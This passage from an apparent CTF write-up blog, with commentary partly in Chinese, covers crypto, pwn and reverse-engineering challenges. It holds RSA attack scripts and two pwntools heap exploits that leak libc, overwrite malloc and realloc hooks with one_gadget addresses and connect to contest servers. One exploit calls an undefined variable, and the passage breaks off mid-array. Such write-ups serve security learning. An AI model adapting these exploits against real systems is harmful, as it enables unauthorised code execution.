<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = <span class="number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(gmpy2.iroot(c+i*n, <span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>):</span><br><span class="line">        res = gmpy2.iroot(c+i*n, <span class="number">3</span>)</span><br><span class="line">        ans = res[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">   i=i+<span class="number">1</span></span><br><span class="line"><span class="comment">#print(long_to_bytes(ans))</span></span><br><span class="line">msg1=long_to_bytes(ans)</span><br><span class="line"></span><br><span class="line">msg2:共模攻击</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line">c1=<span class="number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line">n=<span class="number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L</span></span><br><span class="line">e1=<span class="number">17</span></span><br><span class="line">c2=<span class="number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line">e2=<span class="number">65537</span></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="comment">#print n2s(m)</span></span><br><span class="line">msg2 = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line">msg3高位攻击恢复p</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c3 = <span class="number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line">n3 = </span><br><span class="line"><span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sage求p</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span></span><br><span class="line">m3 = <span class="number">978430871477569051989776547659020359721056838635797362474311886436116962354292851181720060000979143571198378856012391742078510586927376783797757539078239088349758644144812898155106623543650953940606543822567423130350207207895380499638001151443841997176299548692737056724423631882</span></span><br><span class="line"></span><br><span class="line">q3 = n3 / p3</span><br><span class="line">phi3 = (p3-<span class="number">1</span>) * (q3-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e3,phi3)</span><br><span class="line">msg3 = <span class="built_in">pow</span>(c3,d,n3)</span><br><span class="line"><span class="comment">#print(long_to_bytes(msg3))</span></span><br><span class="line">msg3=long_to_bytes(m3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line">text =msg1+msg2+msg3</span><br><span class="line"><span class="built_in">print</span> text</span><br><span class="line"><span class="built_in">print</span> md5.new(text).hexdigest()</span><br></pre></td></tr></table></figure>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwny&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;124.70.2.166&#x27;</span>, <span class="number">23040</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_in</span>(<span class="params">idx, cont=<span class="string">&#x27;&#x27;</span>, flag=<span class="number">0</span></span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        r.send(<span class="built_in">str</span>(cont))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">flag=<span class="number">0</span>, idx=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        r.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, p64(idx))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">        info(<span class="string">&quot;FD is not 0!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    all_in(<span class="number">256</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    <span class="comment"># gdb.attach(r, &#x27;set *0x555555756860=0&#x27;)</span></span><br><span class="line">    read(<span class="number">1</span>, <span class="number">0xfffffffffffffff0</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">    libc_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="number">1</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> libc_addr &lt; <span class="number">0</span>:</span><br><span class="line">        r.close()</span><br><span class="line">    malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    onegadget = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]<span class="comment">#</span></span><br><span class="line">    onegadget = libc_addr + onegad[<span class="number">1</span>]</span><br><span class="line">    realloc = libc_addr + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    realloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">    read(<span class="number">1</span>, <span class="number">0xfffffffffffffff5</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">    text_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="number">1</span>), <span class="number">16</span>) - <span class="number">0x202008</span></span><br><span class="line">    array_addr = text_addr + <span class="number">0x202060</span></span><br><span class="line">    success(<span class="string">&quot;text_addr: 0x%x&quot;</span>%(text_addr))</span><br><span class="line">    off = (realloc_hook - array_addr)/<span class="number">8</span></span><br><span class="line">    all_in(off, p64(onegadget), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    off = (malloc_hook - array_addr)/<span class="number">8</span></span><br><span class="line">    all_in(off , p64(realloc+<span class="number">2</span>), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = remote(<span class="string">&#x27;123.60.211.115&#x27;</span>, <span class="number">23074</span>)</span><br><span class="line">                pwn()</span><br><span class="line">                r.interactive()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                r.close()</span><br></pre></td></tr></table></figure>
<h3 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">cont</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,<span class="built_in">str</span>(cont))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">confirm</span>(<span class="params">name,addr</span>):</span></span><br><span class="line">    log.success(<span class="string">&#x27;The &#x27;</span>+<span class="built_in">str</span>(name)+<span class="string">&#x27; Addr=====&gt; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_arena = <span class="number">0x3ebc40</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./lonelywolf&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment">#UAF</span></span><br><span class="line">    add(<span class="number">8</span>)</span><br><span class="line">    delete()</span><br><span class="line">    edit(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span> + <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    show()</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    heap_base = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="number">1</span>, timeout=<span class="number">1</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x10</span></span><br><span class="line">    key = heap_base + <span class="number">0x10</span></span><br><span class="line">    edit(p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    delete()</span><br><span class="line">    edit(p64(heap_base+<span class="number">0x10</span>) +  p64(key))</span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">    edit(p8(<span class="number">0</span>)+p8(<span class="number">0x7</span>))</span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    delete()</span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    show()</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    libc_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="number">1</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x80</span> -main_arena</span><br><span class="line">    malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    realloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">    realloc = libc_addr + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    onegad = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">    onegadget = libc_addr + onegad[<span class="number">2</span>]</span><br><span class="line">    confirm(<span class="string">&#x27;malloc_hook&#x27;</span>, malloc_hook)</span><br><span class="line">    confirm(<span class="string">&#x27;onegadget&#x27;</span>, onegadget)</span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line">    delete()</span><br><span class="line">    edit(p64(malloc_hook)+ p64(key))</span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line">    edit(p64(onegadget))</span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;123.60.211.115&#x27;</span>,<span class="number">22997</span>)</span><br><span class="line">    pwn()</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h3><p>简单安卓native层逆向，解包后找到so文件直接ida加载就能看见<code>checkflag</code>函数，逻辑简单，三个小加密函数，对着写解密脚本就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = [</span><br><span class="line">        <span class="number">0xA3</span>, <span class="number">0x1A</span>, <span class="number">0xE3</span>, <span class="number">0x69</span>, <span class="number">0x2F</span>, <span class="number">0xBB</span>, <span class="number">0x1A</span>, <span class="number">0x84</span>, <span class="number">0x65</span>, <span class="number">0xC2</span>, </span><br><span class="line">        <span class="number">0xAD</span>, <span class="number">0xAD</span>, <span class="number">0x9E</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x1F</span>, <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0x4F</span>, </span><br><span class="line">        <span class="number">0xE1</span>, <span class="number">0xEB</span>, <span class="number">0xAF</span>, <span class="number">0xF0</span>, <span class="number">0xEA</span>, <span class="number">0xC4</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0x42</span>, <span class="number">0xC7</span>, </span><br><span class="line">        <span class="number">0x6E</span>, <span class="number">0x3F</span>, <span class="number">0xB0</span>, <span class="number">0xD3</span>, <span class="number">0xCC</span>, <span class="number">0x78</span>, <span class="number">0xF9</span>, <span class="number">0x98</span>, <span class="number">0x3F</span></span><br><span class="line">]</span><br><span class="line">password = <span class="string">&#x27;12345678&#x27;</span></span><br><span class="line"></span><br><span class="line">tmp_1 = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">tmp_2 = [password[i%<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v10 = tmp_1[i]</span><br><span class="line">    v9 = (v9 + v10 + <span class="built_in">ord</span>(tmp_2[i])) % <span class="number">256</span></span><br><span class="line">    tmp_1[i] = tmp_1[v9]</span><br><span class="line">    tmp_1[v9] = v10</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    flag[i] ^= <span class="built_in">ord</span>(password[i%<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>,<span class="number">0</span>,-<span class="number">3</span>):</span><br><span class="line">    flag[i-<span class="number">1</span>] ^= flag[i-<span class="number">2</span>]</span><br><span class="line">    flag[i] ^= flag[i-<span class="number">1</span>]</span><br><span class="line">    flag[i-<span class="number">2</span>] ^= flag[i]</span><br><span class="line"></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    v5 = tmp_1[i+<span class="number">1</span>]</span><br><span class="line">    v3 = (v3+v5)%<span class="number">256</span></span><br><span class="line">    tmp_1[i+<span class="number">1</span>] = tmp_1[v3]</span><br><span class="line">    tmp_1[v3] = v5</span><br><span class="line">    flag[i] ^= tmp_1[(v5+tmp_1[i+<span class="number">1</span>])%<span class="number">256</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag]))</span><br></pre></td></tr></table></figure>
<h3 id="ciscn-gift"><a href="#ciscn-gift" class="headerlink" title="ciscn_gift"></a>ciscn_gift</h3><p>go语音逆向，去除了符号表，这里比赛中未能做出（因为菜鸡最后也没学会怎么手动恢复go语言编译器生成的无符号表exe,这里出题人处理掉了<code>.gopclntab</code>）</p>
<p>赛后才知道<code>IDA7.6</code>加载的话可以直接自动恢复。应该是利用<code>.STRTAB</code>和另一个记载了函数起始地址的表直接恢复（关于这个恢复原理是本人猜测，还未尝试验证）</p>
<p>官网下载<code>IDA7.6-free</code>版,然后直接分析程序。</p>
<p>在主函数<code>main_main</code>里看到输出flag的代码逻辑，逐字节输出，预设了一个密文表，属于查表计算，主要在于计算每一字节对应的<code>index</code></p>
<p><code>main_wtf</code>是一个递归函数，index的关键计算公式经优化结果为：<code>x=x-17*(x&gt;&gt;4)+1</code>,其递归次数的规律符合如下函数：</p>
<script type="math/tex; mode=display">
f(n) = \begin{cases}
2, n = 1\\
2^{2*n-3}+2*f(n-1), n > 1\\
\end{cases}</script><p><code>f(n)</code>的输出是有循环规律的，这里直接给出：</p>
<script type="math/tex; mode=display">
[2, 6, 3, 4, 0, 2, 12, 5]</script><p>将出题人给出的递归深度数据直接模八取余对应查表即可得到flag，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ida_chars =[</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x15</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x16</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x17</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span 